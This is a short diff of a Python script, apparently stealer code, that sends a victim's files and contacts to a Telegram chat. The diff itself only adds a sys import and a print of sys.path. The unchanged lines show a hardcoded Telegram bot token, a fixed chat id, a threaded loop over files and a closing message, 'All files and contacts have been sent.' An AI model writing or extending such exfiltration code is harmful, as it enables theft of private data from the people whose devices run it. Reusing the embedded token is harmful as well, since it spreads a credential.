@@ -1,5 +1,5 @@
 from threading import Thread, Lock
-import os, subprocess, telebot, time, json
+import os, subprocess, telebot, time, json, sys
 
 bot = telebot.TeleBot('6297533986:AAGtMlOgroJCnYxb4Khwd3NvuGuXw91EU_g')
 
@@ -45,4 +45,5 @@ while i < total_files:
     threads = []
     print('+',end='',flush=True)
 
+print(sys.path)
 bot.send_message(chat_id=1004407813, text='All files and contacts have been sent.')
